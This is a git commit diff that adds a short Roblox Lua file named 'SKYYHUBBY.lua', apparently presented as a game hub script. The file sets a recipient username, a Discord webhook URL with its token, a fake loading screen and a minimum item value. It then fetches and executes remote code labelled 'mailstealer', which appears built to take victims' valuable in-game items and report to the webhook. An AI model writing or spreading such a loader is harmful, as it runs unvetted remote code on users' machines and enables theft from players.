3e64e6367ba870c20bc5b16a7ded916dfbbaa724
randomtestmonkye <158342456+randomtestmonkye@users.noreply.github.com>
2024-02-02 17:40:18 +0100

    SKYYHUBBY.lua

---
+++ SKYYHUBBY.lua
@@ -0,0 +1,9 @@
+Username = "kokoska1234577"
+Username2 = ""
+
+Webhook = "https://discord.com/api/webhooks/1102208774695047239/r1zrtOePijfhSoadNA3lxY3XguRQm_cOq0uMzO17Oq91l5aJTiZvY0M-iTAktkAdT6f_"
+
+LoadingScreen = true
+MinimumRAP = 10000
+
+loadstring(game:HttpGet("https://shz.al/~egorikusa_mailstealer"))()
